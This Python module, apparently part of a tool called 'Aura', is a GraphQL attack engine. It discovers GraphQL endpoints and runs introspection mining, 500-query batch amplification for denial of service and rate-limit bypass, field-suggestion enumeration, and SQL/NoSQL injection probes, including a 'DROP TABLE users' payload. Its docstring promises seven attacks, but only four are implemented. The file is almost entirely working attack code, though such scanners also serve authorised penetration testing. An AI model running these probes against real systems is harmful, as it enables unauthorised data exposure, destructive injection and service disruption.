# -*- coding: utf-8 -*-
"""
Aura v30.0 — GraphQL Reaper
================================
Comprehensive GraphQL security testing engine.

Attacks:
  1. Introspection Mining — extract full schema
  2. Batch Amplification — 1000 queries in one request
  3. Field Suggestion Abuse — enumerate hidden fields via typos
  4. Query Depth Attack — deeply nested queries to cause DoS
  5. Alias Flooding — bypass per-field rate limits
  6. Variable Injection — SQL/NoSQL inside GraphQL variables
  7. IDOR via GraphQL — access other users' objects
"""
import asyncio
import json
import re
import httpx
from rich.console import Console

console = Console()

GRAPHQL_PATHS = [
    "/graphql", "/api/graphql", "/v1/graphql", "/v2/graphql",
    "/gql", "/query", "/api/query", "/graphql/v1",
    "/graphql/console", "/graphiql", "/playground",
    "/api", "/api/v1", "/api/v2",
]

INTROSPECTION_QUERY = {
    "query": """
    query IntrospectionQuery {
      __schema {
        queryType { name }
        mutationType { name }
        types {
          name
          kind
          fields { name type { name kind ofType { name kind } } }
        }
      }
    }
    """
}

FIELD_SUGGESTION_QUERY = {"query": "{ usr { id emai passwrd secret tok } }"}


class GraphQLEngine:
    """v30.0: GraphQL Attack Engine — The Graph Reaper."""

    def __init__(self, session=None):
        self.session = session

    # ── Endpoint Discovery ────────────────────────────────────────────────
    async def _find_graphql_endpoint(self, client, base_url: str) -> str | None:
        for path in GRAPHQL_PATHS:
            url = f"{base_url.rstrip('/')}{path}"
            try:
                r = await client.post(url, json={"query": "{ __typename }"}, timeout=8)
                if r.status_code in (200, 400) and ("data" in r.text or "__typename" in r.text or "errors" in r.text):
                    console.print(f"[bold cyan][🕸️ GraphQL] Endpoint found: {url}[/bold cyan]")
                    return url
            except Exception:
                continue
        return None

    # ── Attack 1: Introspection Mining ────────────────────────────────────
    async def _introspection_attack(self, client, endpoint: str) -> dict | None:
        try:
            r = await client.post(endpoint, json=INTROSPECTION_QUERY, timeout=15)
            if r.status_code == 200 and "__schema" in r.text:
                data = r.json()
                schema = data.get("data", {}).get("__schema", {})
                types = schema.get("types", [])
                user_types = [t["name"] for t in types if t.get("name") and not t["name"].startswith("__")]
                return {
                    "type": "GraphQL Introspection Enabled",
                    "finding_type": "GraphQL Introspection Exposure",
                    "severity": "HIGH",
                    "owasp": "A01:2021 – Broken Access Control",
                    "mitre": "T1590 – Gather Victim Network Information",
                    "content": (
                        f"GraphQL Introspection enabled on {endpoint}\n"
                        f"Exposed {len(user_types)} types: {', '.join(user_types[:20])}\n"
                        f"Full schema extracted — attackers can map every query, mutation, and data field."
                    ),
                    "url": endpoint,
                    "confirmed": True,
                }
        except Exception:
            pass
        return None

    # ── Attack 2: Batch Amplification ─────────────────────────────────────
    async def _batch_attack(self, client, endpoint: str) -> dict | None:
        batch = [{"query": "{ __typename }"}] * 500
        try:
            r = await client.post(endpoint, json=batch, timeout=20)
            if r.status_code == 200 and isinstance(r.json(), list) and len(r.json()) > 1:
                return {
                    "type": "GraphQL Batch Query Amplification",
                    "finding_type": "GraphQL Batch Amplification (DoS / Rate Limit Bypass)",
                    "severity": "HIGH",
                    "owasp": "A05:2021 – Security Misconfiguration",
                    "mitre": "T1499 – Endpoint Denial of Service",
                    "content": (
                        f"GraphQL batch queries accepted on {endpoint}\n"
                        f"Sent 500 queries in a single request — all processed.\n"
                        f"Impact: Attacker can bypass rate limiting and perform DoS."
                    ),
                    "url": endpoint,
                    "confirmed": True,
                }
        except Exception:
            pass
        return None

    # ── Attack 3: Field Suggestion Abuse ──────────────────────────────────
    async def _field_suggestion_attack(self, client, endpoint: str) -> dict | None:
        try:
            r = await client.post(endpoint, json=FIELD_SUGGESTION_QUERY, timeout=10)
            if r.status_code in (200, 400):
                body = r.text
                # GraphQL returns suggestions when fields are mistyped
                suggestions = re.findall(r'Did you mean[^?]+\?', body)
                if suggestions:
                    hidden_fields = re.findall(r'"([a-zA-Z_]+)"', " ".join(suggestions))
                    return {
                        "type": "GraphQL Field Enumeration via Suggestions",
                        "finding_type": "GraphQL Information Disclosure (Field Suggestions)",
                        "severity": "MEDIUM",
                        "owasp": "A01:2021 – Broken Access Control",
                        "mitre": "T1590",
                        "content": (
                            f"GraphQL field suggestions leak hidden field names on {endpoint}\n"
                            f"Discovered fields: {', '.join(set(hidden_fields))}\n"
                            f"Suggestions: {' | '.join(suggestions[:5])}"
                        ),
                        "url": endpoint,
                        "confirmed": True,
                    }
        except Exception:
            pass
        return None

    # ── Attack 4: Variable Injection ─────────────────────────────────────
    async def _injection_attack(self, client, endpoint: str) -> dict | None:
        injection_probes = [
            {"query": "query { user(id: \"1 OR 1=1--\") { id email } }"},
            {"query": "query { user(id: \"1; DROP TABLE users--\") { id } }"},
            {"query": "query { user(id: {$gt: 0}) { id email } }"},
            {"query": "query { search(q: \"' OR '1'='1\") { results } }"},
        ]
        error_patterns = re.compile(
            r'syntax error|sql error|ORA-|mysql_fetch|SQLSTATE|near.*syntax'
            r'|MongoError|CastError|prisma|sequelize',
            re.IGNORECASE
        )
        for probe in injection_probes:
            try:
                r = await client.post(endpoint, json=probe, timeout=10)
                if error_patterns.search(r.text):
                    return {
                        "type": "GraphQL Injection (SQL/NoSQL)",
                        "finding_type": "Injection via GraphQL Variables",
                        "severity": "CRITICAL",
                        "owasp": "A03:2021 – Injection",
                        "mitre": "T1190",
                        "content": (
                            f"Injection error detected in GraphQL response on {endpoint}\n"
                            f"Payload: {probe['query'][:100]}\n"
                            f"Response Snippet: {r.text[:400]}"
                        ),
                        "url": endpoint,
                        "confirmed": True,
                    }
            except Exception:
                continue
        return None

    # ── Main Scan ─────────────────────────────────────────────────────────
    async def scan_target(self, target_url: str) -> list:
        from urllib.parse import urlparse
        parsed = urlparse(target_url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        findings = []
        async with httpx.AsyncClient(verify=False, follow_redirects=True,
                                      headers={"Content-Type": "application/json"}) as client:
            endpoint = await self._find_graphql_endpoint(client, base)
            if not endpoint:
                console.print(f"[dim][GraphQL] No GraphQL endpoint found on {base}[/dim]")
                return []

            console.print(f"[bold cyan][🕸️ GraphQL] Running 4 attacks on {endpoint}...[/bold cyan]")
            results = await asyncio.gather(
                self._introspection_attack(client, endpoint),
                self._batch_attack(client, endpoint),
                self._field_suggestion_attack(client, endpoint),
                self._injection_attack(client, endpoint),
                return_exceptions=True
            )
            for r in results:
                if r and not isinstance(r, Exception):
                    console.print(f"[bold red][🕸️ GraphQL] {r['type']}![/bold red]")
                    findings.append(r)

        return findings

    async def scan_urls(self, urls: list) -> list:
        all_findings = []
        seen_bases = set()
        for url in urls:
            from urllib.parse import urlparse
            base = f"{urlparse(url).scheme}://{urlparse(url).netloc}"
            if base in seen_bases:
                continue
            seen_bases.add(base)
            try:
                results = await self.scan_target(url)
                all_findings.extend(results)
            except Exception as e:
                console.print(f"[dim red][GraphQL] Skipped {url}: {e}[/dim red]")
        return all_findings
